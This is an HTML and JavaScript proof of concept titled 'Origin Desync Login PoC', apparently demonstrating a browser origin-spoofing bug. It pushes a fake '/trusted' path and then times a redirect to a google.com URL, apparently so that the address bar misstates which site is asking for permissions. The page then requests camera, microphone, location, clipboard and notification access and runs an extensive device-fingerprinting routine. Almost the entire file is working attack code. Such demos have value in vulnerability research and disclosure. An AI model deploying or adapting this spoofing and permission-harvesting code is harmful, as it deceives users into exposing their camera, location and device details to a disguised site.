<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Origin Desync Login PoC</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <style>
    body {
      margin:0;
      font-family:-apple-system,BlinkMacSystemFont,system-ui;
      background:#f5f5f7;
    }

    button {
      margin:6px;
      font-size:14px;
      padding:8px 12px;
    }

    #panel {
      display:none;
      max-width:520px;
      margin:60px auto;
      background:#fff;
      padding:24px;
      border-radius:16px;
      box-shadow:0 20px 60px rgba(0,0,0,.2);
    }

    h2 { text-align:center; margin-bottom:6px; }
    .sub { text-align:center; color:#666; margin-bottom:20px; }

    .notice {
      margin-top:14px;
      font-size:13px;
      color:#b00020;
    }

    video { width:100%; margin-top:10px; }

    pre {
      margin-top:12px;
      background:#111;
      color:#0f0;
      padding:10px;
      font-size:11px;
      max-height:260px;
      overflow:auto;
    }
  </style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Demo</h2>
  <div class="sub">This is a proof of concept for origin desynchronization.</div>

  <hr>

  <button onclick="getLocation()">Get Location</button>
  <p id="locationOutput">Location: -</p>

  <button onclick="openCamera()">Open Camera</button>
  <video id="camera" autoplay playsinline></video>

  <hr>

  <button onclick="callAllAPIs()">CALL ALL APIs</button>
  <button onclick="clearLog()">CLEAR LOG</button>
  <pre id="apiLog"></pre>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const apiLog = document.getElementById('apiLog');

function log(message) {
  apiLog.textContent += message + "\n";
}

// Function to clear the log
const clearLog = () => apiLog.textContent = "";

// Original PoC functions
function getLocation() {
  const output = document.getElementById('locationOutput');
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    pos => output.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`,
    () => output.textContent = 'Permission denied'
  );
}

function openCamera() {
  navigator.mediaDevices.getUserMedia({ video:true })
    .then(s => camera.srcObject = s)
    .catch(() => alert('Camera denied'));
}

trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});

// New API Fingerprinting Function
async function callAllAPIs() {
  log("=== API FINGERPRINT START ===");

  // Storage API
  localStorage.setItem('a', '1');
  sessionStorage.setItem('b', '1');
  indexedDB.open('PWNNNNN');
  log("Storage: OK");

  // Clipboard API
  try { await navigator.clipboard.writeText("PWNNNNN"); log("Clipboard: OK"); }
  catch { log("Clipboard: DENIED"); }

  // Notification API
  if (Notification) log("Notification: " + await Notification.requestPermission());

  // Battery API
  if (navigator.getBattery) {
    const b = await navigator.getBattery();
    log("Battery: " + Math.round(b.level * 100) + "%");
  }

  // Network Information API
  if (navigator.connection)
    log("Network: " + navigator.connection.effectiveType);

  // Vibration API
  navigator.vibrate?.(100);

  // Device Orientation / Motion API
  addEventListener('deviceorientation', e => log("Orientation: " + e.alpha), { once: true });
  addEventListener('devicemotion', () => log("Motion: OK"), { once: true });

  // Speech Synthesis API
  speechSynthesis.speak(new SpeechSynthesisUtterance("API fingerprint"));
  log("Speech synthesis: OK");

  // Speech Recognition API
  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
  log("Speech recognition: " + (SR ? "SUPPORTED" : "NO"));

  // Fullscreen API
  document.documentElement.requestFullscreen().catch(() => {});
  log("Fullscreen: requested");

  // Visibility API
  log("Visibility: " + document.visibilityState);

  // Performance API
  log("Performance.now: " + performance.now());

  // Canvas / WebGL
  const c = document.createElement('canvas');
  c.getContext('2d').fillRect(0, 0, 10, 10);
  log("Canvas: OK");
  log("WebGL: " + (c.getContext('webgl') ? "OK" : "NO"));

  // Gamepad API
  log("Gamepads: " + navigator.getGamepads().length);

  // WebRTC Audio API
  try {
    await navigator.mediaDevices.getUserMedia({ audio: true });
    log("WebRTC audio: OK");
  } catch { log("WebRTC audio: DENIED"); }

  // Screen API
  log(`Screen: ${screen.width}x${screen.height}`);

  // Language / Timezone API
  log("Lang: " + navigator.language);
  log("TZ: " + Intl.DateTimeFormat().resolvedOptions().timeZone);

  // Online Status API
  log("Online: " + navigator.onLine);

  // Permissions API
  if (navigator.permissions) {
    for (const p of ['camera', 'microphone', 'geolocation', 'notifications']) {
      try {
        const r = await navigator.permissions.query({ name: p });
        log(`Perm ${p}: ${r.state}`);
      } catch (err) {
        log(`Permission ${p}: Error`);
      }
    }
  }

  // Device Memory API (Experimental)
  if (navigator.deviceMemory) {
    log("Device Memory: " + navigator.deviceMemory + " GB");
  }

  // Web Bluetooth API (Experimental)
  if (navigator.bluetooth) {
    log("Web Bluetooth: Supported");
  }

  // Web Share API (Experimental)
  if (navigator.canShare) {
    log("Web Share: Supported");
  }

  // Media Session API (Experimental)
  if ('mediaSession' in navigator) {
    log("Media Session: Supported");
  }

  // File System API (Experimental)
  if ('showOpenFilePicker' in window) {
    log("File System Access: Supported");
  }

  // Notifications Permissions API
  if ('Notification' in window) {
    const permission = await Notification.requestPermission();
    log("Notification Permission: " + permission);
  }

  log("=== API FINGERPRINT END ===");
}
</script>

</body>
</html>
